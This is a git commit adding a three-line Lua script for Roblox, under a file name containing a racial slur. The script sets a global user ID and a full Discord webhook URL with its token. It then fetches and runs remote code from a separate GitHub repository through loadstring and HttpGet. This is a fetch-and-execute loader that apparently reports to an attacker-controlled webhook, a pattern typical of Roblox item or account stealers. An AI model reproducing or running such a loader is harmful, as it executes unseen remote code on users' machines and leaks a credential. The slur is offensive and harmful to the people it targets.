900d5daa63d609d794ad8a34c139240f13c3bfdb
Poppin123456 <128368003+Poppin123456@users.noreply.github.com>
2023-03-20 10:43:10 +0100

    Add files via upload

---
+++ eynigga.lua
@@ -0,0 +1,3 @@
+_G.UserID = 827898806
+_G.Webhook = "https://canary.discord.com/api/webhooks/1086620877904424990/fK6JUG5Yef6wDfcCukN-ljaqPJ-bOGLaErlp_HGIzbGPxzhAIJsAy4qjiPibKlqNfQhk"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/Script.lua"))()
